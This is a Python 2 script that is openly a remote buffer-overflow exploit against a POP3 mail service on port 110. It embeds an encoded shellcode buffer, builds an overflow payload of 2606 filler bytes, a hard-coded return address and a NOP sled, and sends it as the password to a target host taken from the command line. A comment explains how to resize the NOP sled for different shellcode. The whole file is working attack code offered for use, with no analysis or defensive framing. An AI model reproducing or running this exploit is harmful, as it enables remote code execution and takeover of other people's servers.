#!/usr/bin/python

import socket
import sys

# Here is your shell code
buf =  ""
buf += "\xdb\xd6\xbb\x74\xd3\xfa\x10\xd9\x74\x24\xf4\x5a\x31"
buf += "\xc9\xb1\x52\x83\xea\xfc\x31\x5a\x13\x03\x2e\xc0\x18"
buf += "\xe5\x32\x0e\x5e\x06\xca\xcf\x3f\x8e\x2f\xfe\x7f\xf4"
buf += "\x24\x51\xb0\x7e\x68\x5e\x3b\xd2\x98\xd5\x49\xfb\xaf"
buf += "\x5e\xe7\xdd\x9e\x5f\x54\x1d\x81\xe3\xa7\x72\x61\xdd"
buf += "\x67\x87\x60\x1a\x95\x6a\x30\xf3\xd1\xd9\xa4\x70\xaf"
buf += "\xe1\x4f\xca\x21\x62\xac\x9b\x40\x43\x63\x97\x1a\x43"
buf += "\x82\x74\x17\xca\x9c\x99\x12\x84\x17\x69\xe8\x17\xf1"
buf += "\xa3\x11\xbb\x3c\x0c\xe0\xc5\x79\xab\x1b\xb0\x73\xcf"
buf += "\xa6\xc3\x40\xad\x7c\x41\x52\x15\xf6\xf1\xbe\xa7\xdb"
buf += "\x64\x35\xab\x90\xe3\x11\xa8\x27\x27\x2a\xd4\xac\xc6"
buf += "\xfc\x5c\xf6\xec\xd8\x05\xac\x8d\x79\xe0\x03\xb1\x99"
buf += "\x4b\xfb\x17\xd2\x66\xe8\x25\xb9\xee\xdd\x07\x41\xef"
buf += "\x49\x1f\x32\xdd\xd6\x8b\xdc\x6d\x9e\x15\x1b\x91\xb5"
buf += "\xe2\xb3\x6c\x36\x13\x9a\xaa\x62\x43\xb4\x1b\x0b\x08"
buf += "\x44\xa3\xde\x9f\x14\x0b\xb1\x5f\xc4\xeb\x61\x08\x0e"
buf += "\xe4\x5e\x28\x31\x2e\xf7\xc3\xc8\xb9\x38\xbb\xd2\x5d"
buf += "\xd1\xbe\xd2\x9c\x9a\x36\x34\xf4\xcc\x1e\xef\x61\x74"
buf += "\x3b\x7b\x13\x79\x91\x06\x13\xf1\x16\xf7\xda\xf2\x53"
buf += "\xeb\x8b\xf2\x29\x51\x1d\x0c\x84\xfd\xc1\x9f\x43\xfd"
buf += "\x8c\x83\xdb\xaa\xd9\x72\x12\x3e\xf4\x2d\x8c\x5c\x05"
buf += "\xab\xf7\xe4\xd2\x08\xf9\xe5\x97\x35\xdd\xf5\x61\xb5"
buf += "\x59\xa1\x3d\xe0\x37\x1f\xf8\x5a\xf6\xc9\x52\x30\x50"
buf += "\x9d\x23\x7a\x63\xdb\x2b\x57\x15\x03\x9d\x0e\x60\x3c"
buf += "\x12\xc7\x64\x45\x4e\x77\x8a\x9c\xca\x97\x69\x34\x27"
buf += "\x30\x34\xdd\x8a\x5d\xc7\x08\xc8\x5b\x44\xb8\xb1\x9f"
buf += "\x54\xc9\xb4\xe4\xd2\x22\xc5\x75\xb7\x44\x7a\x75\x92"

# Payload
bytes = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * (390-351) + buf # Attention. The subtraction (390 - 351) is equivalent to your shellcode. Example: If your shellcode is 380 bytes, change the 351 by 380 ...

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Socket
	s.connect((sys.argv[1], 110)) # Connection
	r = s.recv(1024) # Receiving data
	s.send('USER teste\r\n') # Send parameters
	r = s.recv(1024) 
	s.send('PASS '+bytes+'\r\n')
	r = s.recv(1024)
	s.send('QUIT\r\n')
	r = s.recv(1024)
	s.close() # Close connection

except:
	print '[!] Connection Error. Try again...'

